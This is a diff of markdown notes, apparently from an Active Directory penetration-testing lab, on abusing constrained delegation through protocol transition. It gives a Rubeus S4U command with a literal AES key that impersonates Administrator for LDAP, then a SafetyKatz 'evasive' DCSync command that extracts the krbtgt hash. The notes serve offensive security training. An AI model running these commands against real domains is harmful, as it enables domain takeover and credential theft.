@@ -24,8 +24,19 @@ dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
  
 > [!NOTE] **NOTE**
 > You can edit what services the machine/user account can access if you have `GenericAll/Write` rights to the first hop
-> 
-> **THE SPN VALUE IN THE TGS IS CLEAR-TEXT WHICH MEANS THAT WE CAN CHANGE THE ALLOWED `CIFS/dcorp-mssql.dollarcorp.moneycorp.local` TO `HTTP/dcorp-mssql.dollarcorp.moneycorp.local` IF WE WANTED TO** 
 
 
+#### Protocol Transition
+We can change the protocol/service being accessed for the SPN. This is due to the SPN in the TGS being in clear-text and user editable.
 
+**FOR MACHINE ACCOUNT AES KEYS ALWAYS USE THE ONE WHERE THE SID IS `S-1-5-18` AKA THE LAST ONE IN A LSADUMP**
+
+Rubeus and the `/altservice` parameter
+```powershell
+.\Loader.exe -path .\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt
+```
+
+Now run a DCSync 
+```powershell
+.\Loader.exe -path .\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+```
